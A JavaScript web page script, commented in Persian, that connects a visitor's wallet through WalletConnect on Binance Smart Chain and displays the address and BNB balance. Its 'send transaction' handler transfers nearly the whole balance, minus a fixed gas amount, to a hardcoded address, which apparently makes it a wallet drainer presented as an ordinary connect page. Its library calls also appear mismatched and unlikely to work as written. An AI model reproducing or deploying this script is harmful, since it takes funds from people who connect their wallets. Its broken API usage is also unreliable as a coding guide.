import WalletConnectModal from "@walletconnect/modal";
import WalletConnectEthereumProvider from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";

// پیکربندی WalletConnect با RPC برای شبکه BSC
const providerOptions = {
  walletconnect: {
    package: WalletConnectEthereumProvider,
    options: {
      rpc: {
        56: "https://bsc-dataseed.binance.org/"
      }
    }
  }
};

let provider, signer, walletAddress;

// المان‌های UI
const connectButton = document.getElementById("connectButton");
const sendTransactionButton = document.getElementById("sendTransactionButton");
const walletAddressElement = document.getElementById("walletAddress");
const bnbBalanceElement = document.getElementById("bnbBalance");

// ایجاد modal برای اتصال
const modal = new WalletConnectModal({
  projectId: "4d08946e6c316bed5e76b450ccbb5256",    // ← شناسه پروژه‌ی WalletConnect خود را اینجا وارد کنید
  providerOptions,
  cacheProvider: true
});

// رویداد کلیک روی دکمه اتصال
connectButton.addEventListener("click", async () => {
  try {
    // باز کردن modal و متصل شدن به کیف پول
    provider = await modal.connect();
    signer = provider.getSigner();
    walletAddress = await signer.getAddress();

    // نمایش آدرس
    walletAddressElement.textContent = `آدرس کیف پول: ${walletAddress}`;

    // دریافت و نمایش موجودی BNB
    const balance = await signer.getBalance();
    const bnbBalance = ethers.utils.formatEther(balance);
    bnbBalanceElement.textContent = `موجودی BNB: ${bnbBalance}`;

    // نمایش دکمه ارسال تراکنش
    sendTransactionButton.style.display = "inline-block";
  } catch (error) {
    console.error("خطا در اتصال به کیف پول:", error);
    alert("اتصال به کیف پول ناموفق بود.");
  }
});

// رویداد کلیک روی دکمه ارسال تراکنش
sendTransactionButton.addEventListener("click", async () => {
  try {
    const recipientAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";  // آدرس مقصد خود را اینجا وارد کنید

    // دریافت موجودی کل
    const balance = await signer.getBalance();

    // هزینه گس ثابت: 0.001 BNB
    const gasFee = ethers.utils.parseEther("0.001");

    // چک موجودی کافی
    if (balance.lt(gasFee)) {
      alert("موجودی کیف پول برای پرداخت gas کافی نیست!");
      return;
    }

    // محاسبه باقی‌مانده پس از کسر گس
    const amountToSend = balance.sub(gasFee);

    // ارسال تراکنش
    const tx = await signer.sendTransaction({
      to: recipientAddress,
      value: amountToSend
    });

    // منتظر تایید تراکنش
    await tx.wait();
    alert("تراکنش با موفقیت ارسال شد!");
  } catch (error) {
    console.error("خطا در ارسال تراکنش:", error);
    alert("ارسال تراکنش ناموفق بود.");
  }
});
